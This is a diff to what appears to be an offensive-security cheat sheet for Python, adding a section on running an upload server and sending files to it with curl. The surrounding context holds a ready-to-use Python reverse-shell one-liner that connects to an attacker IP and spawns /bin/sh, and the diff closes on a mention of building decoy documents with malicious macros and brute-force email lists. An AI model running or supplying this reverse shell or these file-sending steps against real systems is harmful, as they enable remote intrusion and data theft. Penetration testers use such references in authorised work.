@@ -585,6 +585,21 @@ pythoncom.PumpMessages()
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
+# Python Basic File Upload
+
+```python
+# Listen to files
+python3 -m pip install --user uploadserver
+python3 -m uploadserver
+# With basic auth: 
+# python3 -m uploadserver --basic-auth hello:world
+
+# Send a file
+curl -X POST http://HOST/upload -H -F 'files=@file.txt' 
+# With basic auth:
+# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
+```
+
 ## Generating HoneyDocs with Python:
 
 Python's Faker module can be utilized to create honeydocs of PII with malicious macros, wordlists, emails for login brute-forcing, and much more.
